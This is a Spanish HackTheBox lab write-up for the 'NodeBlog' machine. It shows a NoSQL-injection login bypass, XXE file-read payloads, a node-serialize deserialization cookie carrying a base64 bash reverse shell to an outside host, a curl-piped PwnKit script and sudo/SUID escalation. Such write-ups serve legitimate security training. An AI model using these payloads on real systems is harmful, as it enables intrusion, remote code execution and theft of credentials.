---
layout: default
title: NodeBlog
parent: HackTheBox
grand_parent: Writeups
---

# NodeBlog
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Tenemos un sitio web a travez del puerto 5000 con NodeJS y ExpressJS con un panel de login el cual es vulnerable a NoSQLi con el que podemos hacer Authentication Bypass, despues descubriremos un apartado para subir archivos XML el cual es vulnetable a XXE con el cual podemos leer archivos internos de la maquina, sin embargo, ocasionando un error se va a filtrar el directorio de la aplicacion, asi que usando XXE vamos leer el archivo server.js en donde descubriremos una Insecure Deserialization en node-serialize, asi que haremos un Deserialization Attack usando IIFE para conseguir RCE, para la escalada encontraremos un puerto que corresponde a MongoDB y encontraremos las credenciales de admin donde a nivel de sudoers podemos ejecutar lo que sea

{:.lead}

## Enumeracion

Iniciamos con un escaneo de nmap con:

```ruby
nmap -sS -n -Pn -T4 --open -p- 10.10.11.216
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay dos puertos abiertos, 22(SSH) y 5000:

```ruby
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:

```ruby
nmap -sCV -p22,5000 10.10.11.139
```

```ruby
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Con el puerto 22 no podemos hacer nada interesante mas que estamos contra un Ubuntu, ademas de que no tenemos credenciales, pero por el puerto **5000** tenemos que hay un servidor web que esta usando NodeJS del lado del servidor y ExpressJS como [middleware](https://expressjs.com/es/guide/using-middleware.html)


Si realizamos fuzzing de directorios con fuerza bruta mediante wfuzz lo unico que encontraremos es que hay una ruta que corresponde a **/login**

```ruby
wfuzz -u 'http://10.10.11.139:5000/FUZZ' -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100 --hc=40
000000053:   200        27 L     59 W       1002 Ch     "login"
```


### Explorando el sitio web

Al entrar a la web tenemos como un "blog" y que tiene cierta informacion que no parace interesante

![](/assets/img/nodeBlog/1.png)

Tambien tenemos un login que descubrimos cuando hicimos fuzzing

![](/assets/img/nodeBlog/2.png)

Si probamos con credenciales random como lo puenden ser **c4rta** y **nose** nos dice que el usuario es invalido

![](/assets/img/nodeBlog/3.png)

Pero si probramos con credenciales que suelen ser por defecto, como: **admin** y **admin**, nos dice que la contraseña es invalida

![](/assets/img/nodeBlog/4.png)

Esto nos da a entender que el usuario **admin** es un usuario valido

## NoSQLi (Authentication Bypass)

Al interceptar la peticion con burp nos podemos dar cuenta de como se esta enviando nuestra peticion:

```ruby
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

user=c4rta&password=nose
```
No hay mucho de destacar, podemos ver en el **Content-Type** que el contenido que estamos enviando es un formulario en URL encode, es una peticion POST, y demas, sin embargo, como estamos contra un login, siempre es bueno probar si existe una SQLi o NoSQLi para hacer **Authentication Bypass**, les puedo adelantar que mediante SQLi no se va a poder, y viendo por las tecnologias que hemos encontrado hasta ahora, es muy probable que use **MEAN stack**, asi que probaremos con NoSQLi

> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass)

De primeras podemos probar con 

```ruby
user=admin&password[$ne]=mizuki
```

El **[$ne]** significa **not equal**, y esta funcionando asi: Si el **user** es igual a **admin** y la **password** no es igual a **mizuki**, se estarian cumpliendo las dos condiciones por que el usuario **admin** si es un usuario valido y la contraseña de ese usuario no es **mizuki**, asi que la consulta seria verdadera y nos deberia de iniciar sesion, en mi caso usare curl:

```ruby
curl -v -X POST -d 'user=admin&password[$ne]=mizuki' 10.10.11.139:5000/login 2>&1 | grep -E "Content-Length|Invalid"
```

Pero no funcionara:

```ruby
curl -v -X POST -d 'user=admin&password[$ne]=mizuki' 10.10.11.139:5000/login 2>&1 | grep -E "Content-Length|Invalid"
> Content-Length: 31
< Content-Length: 1040
            Invalid Password
```

Sin embargo podemos indicarle, que el **Content-Type** sea JSON para ver si ahora si funciona, simplemenete al comando le agregamos el **-H** para especificar que el encabezado **Content-Type** sea **application/json** y modificamos el fomato de los datos a enviar:

```ruby
curl -v -X POST -d '{"user": "admin", "password": {"$ne": "mizuki"}}' -H 'Content-Type: application/json' 10.10.11.139:5000/login 2>&1 | grep -E "Content-Length|Invalid"
```

Y ahora dio una respuesta diferente al ```Content-Length: 1040``` y ya no muestra el ```Invalid Password```

```ruby
curl -v -X POST -d '{"user": "admin", "password": {"$ne": "mizuki"}}' -H 'Content-Type: application/json' 10.10.11.139:5000/login 2>&1 | grep -E "Content-Length|Invalid"
> Content-Length: 48
< Content-Length: 2625
```

Eso significa que funciono, en caso de que lo estes haciendo como yo, con curl, puedes modificar el comando y quitarle el grep, asi que quedaria de esta forma:

```ruby
curl -v -X POST -d '{"user": "admin", "password": {"$ne": "mizuki"}}' -H 'Content-Type: application/json' 10.10.11.139:5000/login
```

Ahora saldra mas informacion, y en los encabezados de respuesta podras ver una cookie de sesion:

```ruby
Set-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; Expires=Wed, 09 Aug 2023 03:24:03 GMT; HttpOnly
```

Asi que ahora debemos de establecer esa cookie en el navegador, puedes usar Cookie Editor o desde el mismo navegador, yo use Cookie Editor y quedo asi:

![](/assets/img/nodeBlog/5.png)

Y el recargar la pagina en la ruta **/** ya podremos acceder como admin evadiendo el login

![](/assets/img/nodeBlog/6.png)

### Extra

Mientras probaba con curl al realizar las peticiones, hubo un momento donde se me olvido cerrar una llave en este comando:

```ruby
curl -v -X POST -d '{"user": "admin", "password": {"$ne": "mizuki"}' -H 'Content-Type: application/json' 10.10.11.139:5000/login
```

Y eso me arrojo esto:

```ruby
*   Trying 10.10.11.139:5000...
* Connected to 10.10.11.139 (10.10.11.139) port 5000 (#0)
> POST /login HTTP/1.1
> Host: 10.10.11.139:5000
> User-Agent: curl/8.1.1
> Accept: */*
> Content-Type: application/json
> Content-Length: 47
> 
< HTTP/1.1 400 Bad Request
< X-Powered-By: Express
< Content-Security-Policy: default-src 'none'
< X-Content-Type-Options: nosniff
< Content-Type: text/html; charset=utf-8
< Content-Length: 849
< Date: Thu, 10 Aug 2023 02:36:34 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected end of JSON input<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br> &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)</pre>
</body>
</html>
* Connection #0 to host 10.10.11.139 left intact
```

Parece una tonteria, pero no, desde mi experiencia en CTFs, cuando a una aplicacion se le proporciona una entrada invalida va a petar, y en ocaciones mostrara informacion que puede ser de utilidad, y muchas veces esa informacion es la ruta de donde recide a aplicacion, y este caso podemos ver que es **/opt/blog/**, **esto sera inportante mas adelante**

## XXE (File Read)

Si exploramos otra vez, ahora vamos a poder subir archivos y crear nuevos posts, nos centraremos en la parte de subir archivos, si intentamos subir un archivo cualquiera, un txt por ejemplo, nos arrojara un mensaje como este:

```
Invalid XML Example: Example DescriptionExample Markdown
```

Al paracer esta esperando un XML con una estructura, si le damos Ctrl + U para ver el codigo fuente, vamos a poder ver la estructura que espera:

```ruby
Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

```xml
<post>
    <title>Example Post</title>
    <description>Example Description</description>
    <markdown>Example Markdown</markdown>
</post>
```

Asi que ahora subiremos un XML con esa estructura para probar, y vean que nos lo interpreta:

![](/assets/img/nodeBlog/7.png)

En este punto como sabemos que podemos subir archivos XML y este sera interpretado, intentaremos probar XXE pero no centraremos en leer archivos de la maquina de esta manera:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY archivo SYSTEM "file:///etc/passwd"> ]>
<post>
    <title>ola</title>
    <description>descripcion ejemplo</description>
    <markdown>&archivo;</markdown>
</post>
```

- Con **<!DOCTYPE foo [ <!ENTITY archivo SYSTEM "file:///etc/passwd"> ]>** se le esta indicando que defina una entidad externa con el nombre **archivo** la cual hace uso del wrapper **file://** para apuntar al archivo **/etc/passwd**, si probamos vamos a poder ver el archivo passwd, lo que estaria pasando es que la entidad externa se estaria procesando, y gracias al wapper file, se estaria incluyendo el archivo **passwd** en la respuesta del servidor

![](/assets/img/nodeBlog/8.png)

### XXE (leyendo el archivo de la aplicacion)

Recordemos que anteriormente les habia mostrado que en el panel de login cuando se le manda una entrada incorrecta, la aplicacion peta y filtra la ruta de la aplicacion, la cual es **/opt/blog/**, nuestro objetivo es encontrar el archivo main de la aplicacion, tambien recuerden que en la enumeracion nos dimos cuenta que aplicacion hace uso de **NodeJS**, pues en una aplicacion de **NodeJS** los nombres del archivo main mas comunes son: **server.js**, **app.js**, **index.js** o **main.js**, asi que usaremos el XXE para apuntar a ese archivo, les puedo adelantar que el correcto en este caso es el **server.js**, y nuestro payload quedaria asi:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY archivo SYSTEM "file:///opt/blog/server.js"> ]>
<post>
    <title>ola</title>
    <description>descripcion ejemplo</description>
    <markdown>&archivo;</markdown>
</post>
```

El ejecutarlo obtendremos el contenido de ese archivo

![](/assets/img/nodeBlog/9.png)

```js
const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}


app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)


app.listen(5000)
```

## Insecure Deserialization

Observa que en los imports se importa **node-serialize**

```js
const serialize = require('node-serialize')
```

**node-serialize** es un modulo de NodeJS para deserializar y serializar objetos JSON, este modulo es controversial por que es vulnerable a RCE mediante una **Insecure Deserialization** en el metodo **unserialize** si se usa una expresion **IIFE**.

### Analisis del codigo

La parte interesante es la funcion **authenticated**

```js
function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}
```
La funcion recibe un unico parametro que es **c**, que en esta caso es una objeto en JSON serializado

- El primer if verifica si el objerto serializado (c) que corresponde a la cookie, es **undefined**, osea que si no se proporciona, entonces regresa **false**, esto es simplemente para comprobar si el usuario no esta autenticado

- Con **c = serialize.unserialize(c)** se este deserializando el objeto **c**, observa que **unserialize** se utiliza sobre la cookie (c), esa cookie es la misma que usamos anteriormente, esa cookie esta en formato JSON y en URL encode, si la decodificamos, obtenemos algo como esto:

```json
{"user":"admin","sign":"23e112072945418601deb47d9a6c7de8"}
```

- Con el ultimo if se verifica si la firma de la cookie es correcta, esta comprobacion la hace calculando el hash **MD5** del resultado de concatenar **cookie_secret** y **c.user**

Como sabemos que el metodo **unserialize** es vulnerable a **Insecure Deserialization** y ademas de que la cookie se le pasa a **unserialize**, entonces debemos de agregar nuestro payload a la cookie, la explotacion la hare guiandome de [aqui](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) y de [aqui](https://security.snyk.io/vuln/npm:node-serialize:20170208), basicamente nos dice que podemos conseguir RCE si le pasamos un objeto serializado malicioso usando IIFE para invocar inmediatemente la funcion.

### IIFE

Antes de explotar, veremos como funciona IIFE, IIFE significa **Immediately Invoked Function Expression**, y son funciones que se ejecutan tan pronto como se definen, ej

Tenemos una funcion como esta:

```js
function hola() {
  console.log("hola");
}
```

Que no se va a ejecutar hasta que nosotros la mandemos llamar de una forma parecida a esta: **hola();**, pero que pasara si ahora nosotros la convertimos en esto:

```js
(function () {
  console.log("hola");
})();
```
Observa como se agregaron parentesis de mas, y al final se le agrego un **();**, eso se hizo para indicarle que la funcion sea llamada, es decir que permita una ejecucion inmediata apenas sea definida la funcion, basicamante el **();** en el que nos permite ejecutar la funcion apenas sea definida, si quieres saber mas haz click [aqui](https://developer.mozilla.org/en-US/docs/Glossary/IIFE)

## Deserializacion Attack (IIFE)

Regresando a la explotacion, primero para probar la vulnerabilidad debemos de generar objeto serializado usando ```node-serialize```, asi que instalaremos ese modulo

```ruby
npm install node-serialize
```

Despues creamos un archivo de js y usaremos este PoC:

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'whoami \', function(error, stdout, stderr) { console.log(stdout) });}()"}'; 
serialize.unserialize(payload);
```

Observa que la variable payload es la que tiene todo nuestro payload, unico que esta haciendo es definir una funcion que usara **exec** para ejecutar un comando, en este caso es **whoami**, la parte de IIFE entra al final del payload, observa como al final se le agrega un **()**, que como mencione anteriormente, esta permitiendo que la funcion se ejecutara inmediatemente apenas sea definida, el resultado de ejecutar esto, es el resultado de ejecutar el comando **whoami**

![](/assets/img/nodeBlog/10.png)

Asi que ahora debemos de hacer lo mismo pero en la maquina victima, ¿Y como?, usaremos un payload similar a este:

```json
{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'whoami \', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

Pero en lugar de ejecutar el whoami, ejecutaremos una reverse shell, y ese payload lo URL encodearemos y lo pasaremos como cookie, si preguntas que por que a la cookie, es por que cuando analizamos el codigo de la aplicacion, la cookie se le pasa al metodo **unserialize**, entonces cuando la aplicacion deserialize la cookie, se estaria deserializando nuestro payload que esta haciendo uso de **IIFE** para ejecutar la funcion y darnos una reverse shell.

Nuestro payload quedaria asi:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDMgMD4mMQo=|base64 -d|bash',function(error,stdout,stderr){console.log(stdout)});}()"}
```
Date cuenta que la reverse shell esta en base64 y simplemente se decodifica, fue generada de esta forma:

```ruby
echo 'bash -i >& /dev/tcp/<ip>/443 0>&1' | base64
```

Esto si lo URL encodeamos queda algo como esto:

```ruby
%7B%22rce%22%3A%22_%24%24ND_FUNC%24%24_function%28%29%7Brequire%28%27child_process%27%29.exec%28%27echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDMgMD4mMQo%3D%7Cbase64%20-d%7Cbash%27%2Cfunction%28error%2Cstdout%2Cstderr%29%7Bconsole.log%28stdout%29%7D%29%3B%7D%28%29%22%7D
```

Y esa seria el valor de la cookie que ingresaremos, de esta forma:

![](/assets/img/nodeBlog/11.png)

Solo recargamos y si estamos en escucha tendremos una shell

## Flag de user

Si vemos que podemos ejecutar a nivel de sudoers, nos pedira una contraseña que no sabemos cual es:

```ruby
admin@nodeblog:/home$ sudo -l
[sudo] password for admin: 
```

Si intentamos ingresar al directorio **admin**, nos dira que no tenemos permisos:

```ruby
admin@nodeblog:/home$ cd admin/
bash: cd: admin/: Permission denied
```

Sin embargo, vemos que nosotros somo el propietario de ese directorio:

```ruby
drw-r--r-- 1 admin admin 220 Jan  3  2022 admin
```

Asi que simplemente podemos darle permisos con chmod y ya esta la flag:

```ruby
admin@nodeblog:/home$ chmod +x admin/
admin@nodeblog:/home$ cat admin/user.txt 
e7713113cad6e97e6f762a60e80cba37
```

## Escalada de privilegios

### Via pwnkit

Si buscamos por binarios SUID con el comando

```ruby
find / -perm -u=s -type f 2>/dev/null
```

Podemos ver que existe el de pkexec: **/usr/bin/pkexec**, asi que existe una via potencial para escalar privilegios con **pwnkit**, para explotarla nos guiaremos de este exploit: [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

Ahi nos dicen que podemos ejecutarlo simplemente con un comando:

```ruby
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

Sin embargo en la maquina no funcionara, asi que descargare el exploit en mi maquina y luego creare un servidor web con python para pasarlo a la maquina victima, simplemente en la maquina victima hacemos un **wget** le damos permisos y ejecutamos y ya somos root:

```ruby
admin@nodeblog:/tmp$ chmod +x PwnKit 
admin@nodeblog:/tmp$ ./PwnKit 
root@nodeblog:/tmp# whoami 
root
root@nodeblog:/tmp# 
```
Sin embargo, esta forma de escalar privilegios esta guarra, asi que lo haremos por la intencionada

### Via mongodb enumeration

Al principio del writeup les habia mencionado que el sitio web es muy probable que use **MEAN stack**, eso significa que usa:

- **M**: MongoDB
- **E**: ExpressJS
- **A**: AngularJS
- **N**: NodeJS

Y la neta tiene toda la pinta de que lo use, si mostramos por puertos abiertos y conexiones establecidas con el comando:

```ruby
netstat -a
```

Podemos ver que existe el puerto **27017**:

```ruby
tcp        0      0 nodeblog:27017          nodeblog:38938          ESTABLISHED
```

Si buscamos en google el puerto por defecto de MongoDB, nos saldra que es ese, y tambien en las conexiones establecidas, podremos ver una conexion con un archivo de MongoDB

```ruby
unix  2      [ ACC ]     STREAM     LISTENING     20468    /run/mongodb/mongodb-27017.sock
```

Entonces lo que queda es empezar a enumerar la base de datos, usando el comando **mongo** nos conectaremos a la base de datos, si usamos **show databases** veremos todas las bases de datos existentes:

```ruby
> show databases
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB
```

Ahora usando **use blog** le indicaremos que haremos uso de la base de datos **blog**, despues usaremos **show collections** para mostrar todas las colecciones existentes en esa base de datos:

```ruby
> show collections
articles
users
```

Despues usamos **find()** para mostar todo el contenido de la coleccion **users**

```ruby
> db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
```

Podemos ver que las credenciales para el usuario admin es **IppsecSaysPleaseSubscribe**

Si recordamos anteriormente, cuando listamos que podiamos ejecutar a nivel de sudoers, nos pedia una contraseña para el usuario admin, asi que ahora usaremos el **sudo -l** y la contraseña sera la que acabamos de sacar:

```ruby
[sudo] password for admin: 
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

Podemos ver que como el usuario admin podemos ejecutar lo que sea, asi que simplemente podemos darle permisos SUID la bash y luego ejecutar un **bash -p** y ya seriamos root

```ruby
sudo chmod u+s /bin/bash
```

```ruby
bash -p
```

```ruby
admin@nodeblog:/home$ sudo chmod u+s /bin/bash
admin@nodeblog:/home$ bash -p
bash-5.0# whoami
root
bash-5.0#
```
Eso ha sido todo, gracias por leer ❤
